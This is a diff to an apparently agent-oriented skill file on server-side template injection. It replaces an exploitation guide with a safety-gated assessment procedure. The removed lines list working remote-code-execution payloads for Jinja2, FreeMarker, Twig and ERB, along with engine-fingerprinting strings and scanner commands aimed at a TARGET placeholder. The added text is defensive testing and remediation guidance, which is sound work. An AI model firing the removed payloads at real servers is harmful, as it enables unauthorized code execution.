@@ -1,126 +1,66 @@
 ---
 name: attack-ssti
-description: "Server-Side Template Injection — detection, engine fingerprinting, and exploitation across 7 template engines"
+description: "Assess server-side template injection using harmless expressions and engine-aware validation"
 category: "web-application"
-version: "1.0"
-author: "cyberstrike-official"
-tags:
-  - ssti
-  - rce
-  - injection
-  - web
-  - attack
-tech_stack:
-  - web
-  - python
-  - java
-  - ruby
-  - php
-cwe_ids:
-  - CWE-94
-  - CWE-1336
-chains_with:
-  - attack-ssrf
-prerequisites: []
-severity_boost:
-  attack-ssrf: "SSTI → SSRF → internal service access = RCE chain"
+version: "1.1.0"
+author: "CyberStrike contributors; consolidated with upstream attribution"
+tags: [ssti, templates, injection, server-side, validation]
+tech_stack: [http, java, python, php, nodejs, dotnet]
+cwe_ids: [CWE-1336]
+chains_with: [attack-prototype-pollution, attack-triage-validation]
+prerequisites:
+  - "Authorized template-rendering endpoint"
+  - "Harmless arithmetic/string marker and non-destructive validation plan"
+sources:
+  - "https://github.com/elementalsouls/Claude-BugHunter/blob/main/skills/hunt-ssti/SKILL.md"
+  - "https://github.com/uphiago/recon-skills"
+  - "https://portswigger.net/web-security/server-side-template-injection"
 ---
 
-# Server-Side Template Injection (SSTI)
+# Server-Side Template Injection (SSTI) Assessment
 
 ## Objective
 
-Detect and exploit server-side template injection to achieve code execution on the server.
+Determine whether user-controlled input is interpreted as template syntax on the server, then establish the reachable impact without executing destructive actions or exposing secrets.
 
-## Testing Methodology
+## Safety gates
 
-### Phase 1: Detection
+Use harmless expressions first. Do not execute shell commands, read server files, access environment variables, trigger callbacks, or attempt RCE against production systems. If impact validation requires code execution, use an isolated lab or explicitly approved staging environment.
 
-```bash
-# Automated SSTI detection across 7 engines
-attack_script ssti_tester "https://TARGET/search?q=FUZZ" --param q --json-output
+## Procedure
 
-# Quick mode (math payloads only)
-attack_script ssti_tester "https://TARGET/render" --param template --quick
-```
+### 1. Identify template contexts
 
-### Phase 2: Generic Detection Payloads
+Look for user-controlled values rendered in email templates, document generation, reports, notifications, page templates, CMS fields, and server-side preview features. Capture the baseline output and determine whether the value is escaped, inserted as text, or parsed as template syntax.
 
-Inject into every user-controlled parameter:
+### 2. Use harmless expressions
 
-```
-{{7*7}}           → 49 (Jinja2, Twig)
-${7*7}            → 49 (FreeMarker, Velocity, EL)
-<%= 7*7 %>        → 49 (ERB, JSP)
-#{7*7}            → 49 (Thymeleaf)
-{{7*'7'}}         → 7777777 (Jinja2 string multiplication)
-```
+Test a small arithmetic or string expression appropriate to the suspected template syntax, changing only one input at a time. Compare the rendered output with the literal input and the expected expression result. Avoid engine-specific payload chains until the engine is reasonably identified.
 
-### Phase 3: Engine Fingerprinting
+### 3. Fingerprint conservatively
 
-```
-{{config.items()}}                    → Jinja2 (Flask/Python)
-{{request.application.__globals__}}   → Jinja2
-${T(java.lang.Runtime)}               → Spring EL
-<#assign x=1>${x}                     → FreeMarker
-{{_self.env.getFilter('id')}}         → Twig (PHP)
-<%= system('id') %>                   → ERB (Ruby)
-```
+Use benign syntax differences and error behavior to narrow the engine family. Do not rely on a stack trace or framework banner alone. Avoid large payloads, recursive loops, expensive expressions, and error-triggering payloads that may affect availability.
 
-### Phase 4: Exploitation
+### 4. Confirm server-side evaluation
 
-**Jinja2 (Python/Flask):**
-```
-{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
-{{''.__class__.__mro__[1].__subclasses__()[XXX]('id',shell=True,stdout=-1).communicate()}}
-```
+Verify that the server evaluates the expression rather than the browser or a client-side template engine. Repeat with a unique marker and confirm the output path. If only a parser error is observed, classify the result as a lead until evaluation is demonstrated.
 
-**FreeMarker (Java):**
-```
-${"freemarker.template.utility.Execute"?new()("id")}
-```
+### 5. Determine impact safely
 
-**Twig (PHP):**
-```
-{{_self.env.registerUndefinedFilterCallback('system')}}{{_self.env.getFilter('id')}}
-```
+Check whether template context exposes untrusted data, permits unintended logic, or reaches privileged objects. Do not attempt file reads, command execution, secret extraction, or outbound callbacks on production. Use an isolated environment to demonstrate higher-impact engine capabilities with a harmless proof.
 
-**ERB (Ruby):**
-```
-<%= `id` %>
-<%= system('id') %>
-```
+### 6. Remediation guidance
 
-### Phase 5: POST-based Injection
+Recommend context-appropriate escaping, avoiding dynamic template construction from untrusted input, sandboxing, least-privilege template context, and patched template dependencies. Input filtering alone is not a robust substitute for safe rendering.
 
-```bash
-# Test POST parameters
-attack_script ssti_tester "https://TARGET/api/render" --param content --method POST --data '{"content":"FUZZ"}'
-```
+## Common false positives
 
-## What Constitutes a Finding
+- Client-side JavaScript evaluates the expression.
+- The input is reflected literally.
+- Error text names a template engine but no expression is evaluated.
+- A framework version is identified without a reachable vulnerable sink.
+- A harmless expression works but no security-relevant context is exposed.
 
-| Finding | Severity |
-|---------|----------|
-| Math expression evaluated (7*7=49) | High (P2) |
-| Config/env data leaked | High (P2) |
-| Command execution achieved | Critical (P1) |
-| File read via template | Critical (P1) |
+## Output contract
 
-## Evidence Requirements
-
-- Injection point (parameter, endpoint)
-- Payload sent
-- Server response showing template evaluation
-- Template engine identified
-- For RCE: command output in response
-
-## Tools
-
-- `attack_script ssti_tester` — automated multi-engine detection
-- `tplmap` (external) — SSTI exploitation framework
-
-## References
-
-- [PortSwigger: SSTI](https://portswigger.net/research/server-side-template-injection)
-- [PayloadsAllTheThings: SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
+Return `input_sink`, `baseline_output`, `expression_test`, `server_side_evaluation`, `engine_confidence`, `reachable_context`, `impact_confirmed`, `environment`, `confidence`, and redacted evidence.
